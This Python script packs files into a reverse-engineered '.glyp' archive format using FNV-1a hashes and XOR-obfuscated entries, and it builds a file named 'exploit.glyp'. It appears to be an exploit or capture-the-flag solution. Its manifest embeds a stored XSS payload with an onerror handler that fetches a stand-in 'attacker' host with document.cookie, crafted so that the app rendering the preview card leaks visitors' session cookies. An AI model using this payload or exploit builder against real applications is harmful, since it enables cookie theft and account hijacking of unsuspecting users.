#!/usr/bin/env python3
"""
.glyp binary packer - reverse engineered from packtool binary.

Format:
  Header (8 bytes):
    0-3: "GLYP" magic
    4:   version (0x01)
    5:   entry_count (must be 2-8)
    6-7: reserved (0x0000)
  
  Entries (each 11-byte header + encrypted path + encrypted body):
    +0:  4 bytes - FNV-1a hash of the path (lowercased, LE)
    +4:  2 bytes - path_length (LE)
    +6:  4 bytes - body_length (LE)
    +10: 1 byte  - entry_kind (1=manifest.mf, 2=covers/*.svg)
    +11: path_length bytes - XOR-encrypted path
    +11+path_len: body_length bytes - XOR-encrypted body

  Path XOR cipher: key_start = 0x17 * kind + 0x41, inc=0x11
  Body XOR cipher: key_start = 0, inc=0x1d, then XOR kind*19, XOR 0xa7
  FNV-1a 32-bit on lowercased path
"""

import struct
import hashlib

def fnv1a_32(data: bytes) -> int:
    """FNV-1a 32-bit hash, applied to lowercased ASCII bytes."""
    h = 0x811c9dc5
    for b in data:
        # Lowercase if uppercase ASCII
        if 0x41 <= b <= 0x5a:
            b = b + 0x20
        h ^= b
        h = (h * 0x01000193) & 0xffffffff
    return h

def encrypt_path(plaintext: bytes, kind: int) -> bytes:
    """XOR encrypt the path."""
    key = 0x17 * kind + 0x41
    out = bytearray()
    for b in plaintext:
        out.append(b ^ (key & 0xff))
        key = (key + 0x11) & 0xffffffff
    return bytes(out)

def encrypt_body(plaintext: bytes, kind: int) -> bytes:
    """XOR encrypt the body."""
    key = 0
    xor_val = (kind * 19) & 0xff
    out = bytearray()
    for b in plaintext:
        # cipher = plain ^ key ^ (kind*19) ^ 0xa7
        out.append(b ^ (key & 0xff) ^ xor_val ^ 0xa7)
        key = (key + 0x1d) & 0xffffffff
    return bytes(out)

def build_glyp(manifest_mf: str, cover_svg_name: str, cover_svg_body: str) -> bytes:
    """
    Build a .glyp file with manifest.mf + covers/*.svg.
    
    Entries must be sorted by ascending FNV-1a hash of their paths.
    """
    # Build manifest entry (kind=1)
    manifest_path = b"manifest.mf"
    manifest_body = manifest_mf.encode('utf-8')
    manifest_hash = fnv1a_32(manifest_path)
    manifest_enc_path = encrypt_path(manifest_path, 1)
    manifest_enc_body = encrypt_body(manifest_body, 1)
    
    # Build cover entry (kind=2)
    cover_path = f"covers/{cover_svg_name}".encode('utf-8')
    cover_body = cover_svg_body.encode('utf-8')
    cover_hash = fnv1a_32(cover_path)
    cover_enc_path = encrypt_path(cover_path, 2)
    cover_enc_body = encrypt_body(cover_body, 2)
    
    # Entries must be sorted by hash ascending
    entries = [
        (manifest_hash, 1, manifest_path, manifest_enc_path, manifest_body, manifest_enc_body),
        (cover_hash, 2, cover_path, cover_enc_path, cover_body, cover_enc_body),
    ]
    entries.sort(key=lambda e: e[0])
    
    # Also check that hash >= entry index (ordering constraint)
    for i, (h, _, _, _, _, _) in enumerate(entries):
        assert h >= i, f"Hash 0x{h:08x} for entry {i} must be >= {i}"
    
    # Build header
    entry_count = len(entries)
    header = b"GLYP" + struct.pack('<B', 1) + struct.pack('<B', entry_count) + struct.pack('<H', 0)
    
    # Build entries
    buf = header
    for h, kind, raw_path, enc_path, raw_body, enc_body in entries:
        path_len = len(enc_path)
        body_len = len(enc_body)
        entry_hdr = struct.pack('<I', h)     # path_hash
        entry_hdr += struct.pack('<H', path_len)  # path_length
        entry_hdr += struct.pack('<I', body_len)  # body_length
        entry_hdr += struct.pack('<B', kind)      # entry_kind
        buf += entry_hdr + enc_path + enc_body
    
    return buf

def verify_glyp(data: bytes) -> dict:
    """Simulate packtool inspect by decrypting a .glyp file."""
    assert data[:4] == b"GLYP", "bad magic"
    assert data[4] == 1, "unsupported version"
    entry_count = data[5]
    assert 2 <= entry_count <= 8, "bad entry count"
    assert data[6:8] == b'\x00\x00', "bad reserved bytes"
    
    result = {}
    pos = 8
    
    for i in range(entry_count):
        path_hash = struct.unpack('<I', data[pos:pos+4])[0]
        path_len = struct.unpack('<H', data[pos+4:pos+6])[0]
        body_len = struct.unpack('<I', data[pos+6:pos+10])[0]
        kind = data[pos+10]
        
        enc_path = data[pos+11:pos+11+path_len]
        enc_body = data[pos+11+path_len:pos+11+path_len+body_len]
        
        path = bytes([enc_path[j] ^ ((0x17 * kind + 0x41 + j * 0x11) & 0xff) for j in range(path_len)])
        # Verify hash
        computed_hash = fnv1a_32(path)
        assert computed_hash == path_hash, f"Hash mismatch for {path}"
        
        key = 0
        xor_val = (kind * 19) & 0xff
        body = bytes([(enc_body[j] ^ (key + j * 0x1d) & 0xff ^ xor_val ^ 0xa7) for j in range(body_len)])
        
        result[path.decode()] = body.decode('utf-8', errors='replace')
    
    return result

if __name__ == "__main__":
    # Test with demo data
    manifest = """name=Malicious Pack
profile.theme=linen
profile.card.title=XSS Test
preview.card=<img src=x onerror="fetch('http://attacker/?'+document.cookie)">"""

    cover_svg = """<svg xmlns='http://www.w3.org/2000/svg' width='320' height='120'>
  <rect width='320' height='120' fill='#f4efe1'/>
  <text x='18' y='68' font-size='28' fill='#835f2d'>XSS</text>
</svg>"""

    glyp = build_glyp(manifest, "xss.svg", cover_svg)
    
    # Write to file
    import sys
    outpath = sys.argv[1] if len(sys.argv) > 1 else "exploit.glyp"
    with open(outpath, 'wb') as f:
        f.write(glyp)
    print(f"Written {len(glyp)} bytes to {outpath}")
    
    # Verify with local packtool
    import subprocess
    result = subprocess.run(['./packtool', 'inspect', outpath], capture_output=True, text=True)
    if result.returncode == 0:
        print("packtool verify: SUCCESS")
        print(result.stdout[:500])
    else:
        print(f"packtool verify: FAILED ({result.stderr})")
        # Try our own verification
        try:
            parsed = verify_glyp(glyp)
            print("Our verification: OK")
            for k, v in parsed.items():
                print(f"  {k}: {v[:80]}")
        except Exception as e:
            print(f"Our verification failed: {e}")
